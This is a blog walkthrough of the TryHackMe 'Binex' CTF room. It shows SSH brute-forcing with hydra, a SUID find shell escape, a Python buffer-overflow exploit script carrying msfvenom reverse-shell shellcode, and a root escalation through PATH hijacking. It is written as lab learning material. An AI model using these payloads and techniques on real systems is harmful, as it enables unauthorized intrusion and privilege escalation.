---
title: "Binex-Tryhackme"
author: "Trevor saudi"
date: 2021-04-01T18:50:44.566Z
lastmod: 2022-05-24T14:31:39+03:00

description: ""

subtitle: "Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation."

image: "/posts/2021-04-01_binextryhackme/images/1.png" 
images:
 - "/posts/2021-04-01_binextryhackme/images/1.png"
 - "/posts/2021-04-01_binextryhackme/images/2.png"
 - "/posts/2021-04-01_binextryhackme/images/3.png"
 - "/posts/2021-04-01_binextryhackme/images/4.png"
 - "/posts/2021-04-01_binextryhackme/images/5.png"
 - "/posts/2021-04-01_binextryhackme/images/6.png"
 - "/posts/2021-04-01_binextryhackme/images/7.png"
 - "/posts/2021-04-01_binextryhackme/images/8.jpeg"
 - "/posts/2021-04-01_binextryhackme/images/9.png"
 - "/posts/2021-04-01_binextryhackme/images/10.png"
 - "/posts/2021-04-01_binextryhackme/images/11.png"
 - "/posts/2021-04-01_binextryhackme/images/12.png"
 - "/posts/2021-04-01_binextryhackme/images/13.png"
 - "/posts/2021-04-01_binextryhackme/images/14.png"
 - "/posts/2021-04-01_binextryhackme/images/15.png"
 - "/posts/2021-04-01_binextryhackme/images/16.png"
 - "/posts/2021-04-01_binextryhackme/images/17.png"
 - "/posts/2021-04-01_binextryhackme/images/18.png"
 - "/posts/2021-04-01_binextryhackme/images/19.png"
 - "/posts/2021-04-01_binextryhackme/images/20.png"
 - "/posts/2021-04-01_binextryhackme/images/21.png"


aliases:
    - "/binex-tryhackme-c07c3423186e"


tags:
- Machine
- BOF
- CTF
---

![image](/posts/2021-04-01_binextryhackme/images/1.png#layoutTextWidth)

> Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.

## Enumeration

Started off by running rustscan to discover open ports. We end up with port 22,139,445

![image](/posts/2021-04-01_binextryhackme/images/2.png#layoutTextWidth)


Port 139 and 445 are NBT and SMB services which we can enumerate with enum4linux

[139,445 - Pentesting SMB](https://book.hacktricks.xyz/pentesting/pentesting-smb)

```bash
enum4linux -A <IP>
```

![image](/posts/2021-04-01_binextryhackme/images/3.png#layoutTextWidth)


The shares weren’t particularly worth looking into. So I let the enumeration finish and we discover some users. `tryhackme` sticks out so let’s try bruteforcing ssh with this user

![image](/posts/2021-04-01_binextryhackme/images/4.png#layoutTextWidth)


### Initial Foothold

Running hydra against the username tryhackme and the rockyout.txt password list gives us the password to the ssh login

![image](/posts/2021-04-01_binextryhackme/images/5.png#layoutTextWidth)


We can now login and exploit the binaries

## Privilege escalation #1: SUID binary

We can begin by locating a binary with SUID bit set.
```bash
find / -perm -u=s -type f 2>/dev/null
```
![image](/posts/2021-04-01_binextryhackme/images/6.png#layoutTextWidth)


The /usr/bin/find can be exploited to execute commands as the des user

[find | GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid)


Using the GTFOBins we obtain the command 
```bash  
/usr/bin/find . -exec /bin/sh -p \; -quit
```

Execute it to obtain a shell with an effective user id of that of des. Navigate to /home/des to obtain his flag

![image](/posts/2021-04-01_binextryhackme/images/7.png#layoutTextWidth)


## Privilege escalation #2: Buffer Overflow

![image](/posts/2021-04-01_binextryhackme/images/8.jpeg#layoutTextWidth)


I am still new to 64-bit BOFs but I was able to navigate my way through this one with a bit of some tutorials.

Let’s change user and work with des. Here we are given a binary file that accepts a string as input. Supplying a given length crashes it.

![image](/posts/2021-04-01_binextryhackme/images/9.png#layoutTextWidth)


I checked the file information and it’s a 64-bit ELF file

![image](/posts/2021-04-01_binextryhackme/images/10.png#layoutTextWidth)


### Fuzzing the binary file and finding the offset

We can generate a bunch of As and try figure out what length of As crash the binary

![image](/posts/2021-04-01_binextryhackme/images/11.png#layoutTextWidth)


Let’s do this inside gdb and observer how our registers behave

![image](/posts/2021-04-01_binextryhackme/images/12.png#layoutTextWidth)


The rbp is overwritten with the As. Let us send a cyclic pattern and see if we can calculate the offset.

![image](/posts/2021-04-01_binextryhackme/images/13.png#layoutTextWidth)


Send that to our program , inspect the registers and copy the value of the rbp

![image](/posts/2021-04-01_binextryhackme/images/14.png#layoutTextWidth)


Use pattern_offset to find the pattern. We get it at 608

![image](/posts/2021-04-01_binextryhackme/images/15.png#layoutTextWidth)


### Overwriting the RBP

We can confirm we have control over the RBP by trying to overwrite it. Generate a payload of 608 As + 8Bs

![image](/posts/2021-04-01_binextryhackme/images/16.png#layoutTextWidth)


The rbp is overwritten with the 8Bs.

### Examining the stack

We now need to examine the stack further so we can find the starting address of the buffer. The command below prints 100 bytes from the top of the stack
`x/100x $rsp`
![image](/posts/2021-04-01_binextryhackme/images/17.png#layoutTextWidth)


The command below gets us the start of the buffer

```bash
x/100x $rsp-700
```

![image](/posts/2021-04-01_binextryhackme/images/18.png#layoutTextWidth)


We can note down an address close to the start of the buffer, we will use this as the value of the rip while creating our final exploit

## Creating the final exploit

We intially found our offset to be **608 bytes**, which means that if we write past **608 bytes** eg **608 +8 = 616 bytes** , we will overwrite the base pointer in the stack. Note that the return address lies just above it, hence **616+8 bytes** are required to overwrite the saved return address.

Let us create a shellcode which we use to spawn a shell using **msfvenom**

![image](/posts/2021-04-01_binextryhackme/images/19.png#layoutTextWidth)


Putting all these into a python script
```python3
from struct import pack
payload_len = 616
nop = b"\x90"*200
new_rip = pack("<Q",0x7fffffffe2d4) #selected randomly near the start of the stack
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x32\xa3\x67\xe0\x79\x51\x8b"
buf += b"\x33\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x58\x8a\x3f\x79\x13\x53\xd4\x59\x33\xfd\x68\xe5\x31"
buf += b"\xc6\xc3\x8a\x30\xa3\x76\xbc\x73\x53\xa2\x92\x63\xeb"
buf += b"\xee\x06\x13\x41\xd1\x59\x18\xfb\x68\xe5\x13\x52\xd5"
buf += b"\x7b\xcd\x6d\x0d\xc1\x21\x5e\x8e\x46\xc4\xc9\x5c\xb8"
buf += b"\xe0\x19\x30\x1c\x50\xca\x09\xcf\x0a\x39\x8b\x60\x7a"
buf += b"\x2a\x80\xb2\x2e\x19\x02\xd5\x3d\xa6\x67\xe0\x79\x51"
buf += b"\x8b\x33"
shellcode = buf
shellcode_len = len(shellcode)
nop_len = len(nop)
padding = b"A"*(payload_len-shellcode_len-nop_len)
payload = [
 nop,
 shellcode,
 padding,
 new_rip
]
payload = b"".join(payload)
print(payload) 

```

_The nop_sled is used to increase our chances of hitting the shellcode hence providing some stability to the exploit. The struct module ensures we obey little endian format_

Start a meterpreter shell or a nc one listening on port 4444

![image](/posts/2021-04-01_binextryhackme/images/20.png#layoutTextWidth)


We get a reverse shell as kel user :) Get the flag and credentials to ssh as kel

### Privilege escalation #3: Path Variable Manipulation

PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored

![image](/posts/2021-04-01_binextryhackme/images/21.png#layoutTextWidth)


the exe.c file on user kel’s home directory shows that we are calling the ps system command. The program will search the ps command in the directories of the PATH variable. We can print out the PATH variables for the kel user as follows
```bash
kel@THM_exploit:~$ echo $PATH  
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
kel@THM_exploit:~$
```

We can stage our attack as follows - Create our own ps file that spawns a shell and add it to the beginning of $PATH. So when we run the exec binary, we get a shell as root

```bash
kel@THM_exploit:~$ cd /tmp  
kel@THM_exploit:/tmp$ echo “/bin/bash” > ps  
kel@THM_exploit:/tmp$ chmod 777 ps  
kel@THM_exploit:/tmp$ echo $PATH  
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
kel@THM_exploit:/tmp$ export PATH=/tmp:$PATH  
kel@THM_exploit:/tmp$ cd  
kel@THM_exploit:~$ ./exe   
root@THM_exploit:~#`
```
We get root !
